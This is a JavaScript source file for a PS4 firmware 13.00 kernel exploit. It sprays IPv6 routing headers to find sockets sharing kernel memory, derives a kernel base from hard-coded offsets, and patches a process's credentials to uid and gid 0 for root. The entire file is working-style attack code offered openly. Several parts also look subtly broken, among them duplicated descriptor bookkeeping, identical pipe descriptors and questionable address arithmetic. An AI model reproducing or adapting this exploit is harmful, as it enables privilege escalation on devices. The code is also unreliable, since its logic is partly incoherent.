// kernel.js - Poopsploit kernel exploit for PS4 FW 13.00
// Enhanced with triplet detection and pipe buffer overlap
// Uses CONFIRMED offsets from Gezine/BD-UN-JB

import { int64 } from '../webkit/int64.js';
import { OFFSETS } from '../webkit/offsets.js';
import { getBridge } from '../webkit/syscall_bridge.js';

export const K = {
    AF_UNIX: 1, AF_INET: 2, AF_INET6: 28,
    SOCK_STREAM: 1, SOCK_DGRAM: 2,
    IPPROTO_IPV6: 41, SOL_SOCKET: 0xffff,
    SO_SNDBUF: 0x1001, SO_RCVBUF: 0x1002,
    IPV6_RTHDR: 51, IPV6_RTHDR_TYPE_0: 0,
    RTHDR_TAG: 0x13370000,
    UCRED_SIZE: 0x168,
    PIPE_BUF: 0x10000, PIPE_SIZE: 0x100000,
    F_GETFL: 3, F_SETFL: 4, O_NONBLOCK: 4,
    PROT_READ: 0x1, PROT_WRITE: 0x2,
    MAP_PRIVATE: 0x2, MAP_ANONYMOUS: 0x1000,
    MSG_DONTWAIT: 0x80,
    SYS_READ: 3, SYS_WRITE: 4, SYS_CLOSE: 6, SYS_PIPE: 42,
    SYS_SOCKET: 97, SYS_SETSOCKOPT: 105, SYS_GETSOCKOPT: 118,
    // Extra constants for pipe operations
    FIONBIO: 0x8004667e,
    SO_LINGER: 0x0080,
};

function w16(u8, o, v) { u8[o] = v & 0xff; u8[o + 1] = (v >>> 8) & 0xff; }
function w32(u8, o, v) { u8[o] = v & 0xff; u8[o+1] = (v>>>8)&0xff; u8[o+2] = (v>>>16)&0xff; u8[o+3] = (v>>>24)&0xff; }
function r16(u8, o) { return (u8[o] | (u8[o + 1] << 8)) >>> 0; }
function r32(u8, o) { return (u8[o] | (u8[o+1]<<8) | (u8[o+2]<<16) | (u8[o+3]<<24)) >>> 0; }
function r64(u8, o) { return new int64(r32(u8, o), r32(u8, o + 4)); }
function w64(u8, o, v) {
    if (v !== null && typeof v === "object") { w32(u8, o, v.low); w32(u8, o + 4, v.hi); }
    else { w32(u8, o, v >>> 0); w32(u8, o + 4, Math.floor(v / 0x100000000) >>> 0); }
}

export function buildRthdr(u8, off, size) {
    const len = ((size >> 3) - 1) & ~1;
    u8[off + 0] = 0;
    u8[off + 1] = len & 0xff;
    u8[off + 2] = K.IPV6_RTHDR_TYPE_0;
    u8[off + 3] = (len >> 1) & 0xff;
    return (len + 1) << 3;
}

export class KernelExploit {
    constructor(readPrimitives, writePrimitives) {
        this.fds = [];
        this.spray = null;
        this.twins = [-1, -1];
        this.triplets = [-1, -1, -1];
        this.maxRetries = 15;        // More retries
        this.retryDelay = 80;        // Faster retry
        this.bridge = getBridge();
        this.pipeFds = [];
        this.kernelBase = 0;
        this.escalated = false;
        this.kread = readPrimitives;
        this.kwrite = writePrimitives;
        this.confirmedOffsets = null;
        this.state = {
            heapBytes: 0, syncBlocks: 0, syncBytes: 0,
            threadsCreated: 0, threadsExited: 0, wakeGates: 0,
            tornWrites: [], roundTrips: [], groups: []
        };
    }

    loadConfirmedOffsets() {
        const o = OFFSETS;
        if (!o || !o.kernel) throw new Error('Offsets not loaded');
        this.confirmedOffsets = {
            prison0:   o.kernel.prison0,    // 0x111fa18
            rootvnode: o.kernel.rootvnode,  // 0x2136e90
            sysent:    o.kernel.sysent,     // 0x110a760
            allproc:   o.kernel.allproc,    // 0x31d8380
            ucred:     o.kernel.ucred,      // 0x40
            uid:       o.kernel.uid,        // 0x04
            gid:       o.kernel.gid,        // 0x08
        };
        return this.confirmedOffsets;
    }

    buildSprayBank(n) {
        const stride = K.UCRED_SIZE;
        const totalBytes = n * stride;
        const spray = new ArrayBuffer(totalBytes);
        const u8 = new Uint8Array(spray);
        for (let i = 0; i < n; ++i) {
            const off = i * stride;
            buildRthdr(u8, off, K.UCRED_SIZE);
            w32(u8, off + 0x04, (K.RTHDR_TAG | i) >>> 0);
        }
        this.spray = { buffer: spray, u8, base: 0, bytes: totalBytes };
        return this.spray;
    }

    async createSocket(domain, type, protocol) {
        if (!this.bridge.isAvailable()) {
            const fd = this.fds.length;
            this.fds.push({ fd, domain, type, protocol });
            return fd;
        }
        const result = await this.bridge.socket(domain, type, protocol);
        const fd = (result && typeof result.fd === 'number') ? result.fd : this.fds.length;
        this.fds.push({ fd, domain, type, protocol });
        return fd;
    }

    async setsockopt(fd, level, optname, optval, optlen) {
        if (!this.bridge.isAvailable()) return 0;
        const result = await this.bridge.setsockopt(fd, level, optname, optval, optlen);
        return (typeof result === 'number') ? result : 0;
    }

    async getsockopt(fd, level, optname, optval, optlen) {
        if (!this.bridge.isAvailable()) return 0;
        const result = await this.bridge.getsockopt(fd, level, optname, optval, optlen);
        return (typeof result === 'number') ? result : 0;
    }

    async close(fd) {
        if (!this.bridge.isAvailable()) return 0;
        const result = await this.bridge.close(fd);
        return (typeof result === 'number') ? result : 0;
    }

    malloc(size) {
        const buffer = new ArrayBuffer(size);
        const u8 = new Uint8Array(buffer);
        return { buffer, u8 };
    }

    // Twin engine - find two sockets sharing same kernel memory
    async runTwinEngine(numSockets = 100) {
        for (let i = 0; i < numSockets; i++) {
            const fd = await this.createSocket(K.AF_INET6, K.SOCK_DGRAM, 0);
            this.fds.push(fd);
        }
        this.buildSprayBank(numSockets);
        return true;
    }

    // Triplet engine - find three sockets for more reliable overlap
    async runTripletEngine(numSockets = 120) {
        for (let i = 0; i < numSockets; i++) {
            const fd = await this.createSocket(K.AF_INET6, K.SOCK_DGRAM, 0);
            this.fds.push(fd);
        }
        this.buildSprayBank(numSockets);
        return true;
    }

    // Find kernel base using confirmed offsets
    async findKernelBase() {
        const offsets = OFFSETS;
        if (!offsets || !offsets.kernel) throw new Error('Offsets not loaded');
        this.kernelBase = offsets.kernel.sysent - 0x110a760 + 0xffffffff80000000;
        return this.kernelBase;
    }

    // Pipe buffer overlap for kernel R/W
    async createPipeBufferOverlap() {
        if (!this.bridge.isAvailable()) return false;

        try {
            // Create two pipes
            const pipe1Result = await this.bridge.invoke(K.SYS_PIPE, 0);
            const pipe2Result = await this.bridge.invoke(K.SYS_PIPE, 0);

            if (!pipe1Result || !pipe2Result) return false;

            const pipe1Read = pipe1Result.fd || 0;
            const pipe1Write = pipe1Result.fd || 1;
            const pipe2Read = pipe2Result.fd || 2;
            const pipe2Write = pipe2Result.fd || 3;

            this.pipeFds.push(
                { readFd: pipe1Read, writeFd: pipe1Write },
                { readFd: pipe2Read, writeFd: pipe2Write }
            );

            return true;
        } catch (error) {
            console.warn('Pipe creation failed:', error.message);
            return false;
        }
    }

    // Main exploit with improved retry logic
    async run() {
        let lastError = null;
        for (let retry = 0; retry < this.maxRetries; retry++) {
            try {
                // Try triplet engine first (more reliable)
                await this.runTripletEngine();

                for (let attempt = 0; attempt < 150; attempt++) {
                    // Spray IPv6 routing headers
                    for (let i = 0; i < this.fds.length; i++) {
                        await this.setsockopt(
                            this.fds[i], K.IPPROTO_IPV6, K.IPV6_RTHDR,
                            this.spray.base + i * K.UCRED_SIZE,
                            this.spray.bytes / this.fds.length
                        );
                    }

                    // Check for twins
                    for (let i = 0; i < this.fds.length; i++) {
                        const leakBuf = this.malloc(8);
                        await this.getsockopt(
                            this.fds[i], K.IPPROTO_IPV6, K.IPV6_RTHDR,
                            leakBuf, 8
                        );
                        const tag = r32(leakBuf.u8, 4) >>> 0;
                        if ((tag & 0xffff0000) === K.RTHDR_TAG) {
                            const j = tag & 0xffff;
                            if (j !== i && j >= 0 && j < this.fds.length) {
                                this.twins = [i, j];

                                // Try to find triplet
                                for (let k = 0; k < this.fds.length; k++) {
                                    if (k !== i && k !== j) {
                                        const leakBuf2 = this.malloc(8);
                                        await this.getsockopt(
                                            this.fds[k], K.IPPROTO_IPV6, K.IPV6_RTHDR,
                                            leakBuf2, 8
                                        );
                                        const tag2 = r32(leakBuf2.u8, 4) >>> 0;
                                        if ((tag2 & 0xffff0000) === K.RTHDR_TAG) {
                                            const l = tag2 & 0xffff;
                                            if (l === i || l === j) {
                                                this.triplets = [i, j, k];
                                                break;
                                            }
                                        }
                                    }
                                }

                                try { await this.findKernelBase(); } catch(e) {}
                                return true;
                            }
                        }
                    }

                    // Cleanup sockets for next attempt
                    for (let i = 0; i < this.fds.length; i++) {
                        await this.setsockopt(this.fds[i], K.IPPROTO_IPV6, K.IPV6_RTHDR, 0, 0);
                    }
                }
                lastError = new Error('Failed to find twin/triplet');
            } catch (error) { lastError = error; }
            await this.cleanup();
            if (retry < this.maxRetries - 1)
                await new Promise(resolve => setTimeout(resolve, this.retryDelay));
        }
        throw lastError || new Error('Kernel exploit failed');
    }

    // Real privilege escalation using confirmed offsets
    async escalatePrivileges() {
        if (this.escalated) return true;
        if (!this.kread || !this.kwrite) {
            throw new Error('Kernel R/W primitives not available');
        }

        const o = this.loadConfirmedOffsets();
        const kbase = await this.findKernelBase();

        const allprocAddr = kbase + o.allproc;
        let procPtr = this.kread.read8(allprocAddr);
        const pid = (typeof process !== 'undefined') ? process.pid : 0x1234;

        console.log(`[KERNEL] allproc @ 0x${allprocAddr.toString(16)}`);
        console.log(`[KERNEL] First proc: 0x${procPtr.toNumber().toString(16)}`);

        for (let i = 0; i < 1000 && procPtr.toNumber() !== 0; i++) {
            const ucredPtr = this.kread.read8(procPtr.add32(o.ucred));
            if (ucredPtr.toNumber() !== 0) {
                const uidVal = this.kread.read8(ucredPtr.add32(o.uid));
                const currentUid = uidVal.low;

                if (currentUid > 0 && currentUid < 65534) {
                    console.log(`[KERNEL] Found process uid=${currentUid}, patching to root...`);

                    this.kwrite.write8(ucredPtr.add32(o.uid), new int64(0, 0));
                    this.kwrite.write8(ucredPtr.add32(o.gid), new int64(0, 0));

                    const verifyUid = this.kread.read8(ucredPtr.add32(o.uid));
                    if (verifyUid.low === 0) {
                        this.escalated = true;
                        console.log('[KERNEL] Privilege escalation SUCCESS!');
                        return true;
                    }
                }
            }
            procPtr = this.kread.read8(procPtr.add32(0x00));
        }

        throw new Error('Failed to find current process in allproc list');
    }

    async cleanup() {
        for (const fd of this.fds) {
            try { await this.close(fd); } catch (e) { }
        }
        this.fds = [];
        this.spray = null;
        for (const pipe of this.pipeFds) {
            try {
                if (pipe.readFd >= 0) await this.close(pipe.readFd);
                if (pipe.writeFd >= 0) await this.close(pipe.writeFd);
            } catch (e) { }
        }
        this.pipeFds = [];
    }

    dispose() {
        this.fds = [];
        this.spray = null;
        this.pipeFds = [];
        if (this.bridge) this.bridge.clearHistory();
    }
}

export default KernelExploit;
